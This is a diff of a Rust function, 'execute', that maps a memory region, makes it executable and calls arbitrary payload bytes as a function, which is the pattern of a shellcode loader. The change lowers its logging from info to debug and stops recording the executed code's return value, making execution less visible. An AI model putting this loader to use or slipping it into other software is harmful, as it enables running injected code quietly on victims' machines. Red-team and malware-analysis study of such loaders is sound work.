@@ -1,7 +1,7 @@
 use std::{ptr, thread};
 
 use libc::{mmap, mprotect, MAP_ANONYMOUS, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE};
-use log::{error, info};
+use log::{debug, error, info};
 
 #[no_mangle]
 pub fn execute(payload: &[u8]) -> Result<(), u32> {
@@ -36,14 +36,13 @@ pub fn execute(payload: &[u8]) -> Result<(), u32> {
                     error!("ERROR");
                     panic!("Failed to set memory as executable");
                 }
-                info!("Executable memory allocated at: {:?}", addr);
+                debug!("Executable memory allocated at: {:?}", addr);
                 assert!(!addr.is_null(), "exec_mem is NULL!");
                 //Cast the memory address to a callable function pointer
                 let func: extern "C" fn() -> u32 = std::mem::transmute(addr);
 
                 //Call the function
-                let result = func();
-                info!("Function executed, returned: {}", result);
+                let _ = func();
             }
         }
     });
